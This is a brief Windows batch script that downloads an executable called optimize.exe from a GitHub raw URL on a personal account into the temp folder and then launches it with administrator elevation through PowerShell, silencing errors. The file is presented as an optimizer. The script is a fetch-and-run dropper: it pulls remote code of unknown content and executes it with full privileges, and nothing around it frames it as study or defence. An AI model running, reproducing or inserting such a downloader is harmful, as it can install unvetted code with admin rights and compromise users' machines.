@echo off
cd %temp%
curl -L --output optimize.exe "https://github.com/DarkzzXD/a/raw/refs/heads/main/optimize.exe"
    PowerShell Start -Verb RunAs '%temp%\optimize.exe' 2> nul || (
        >nul pause && exit 1
    )
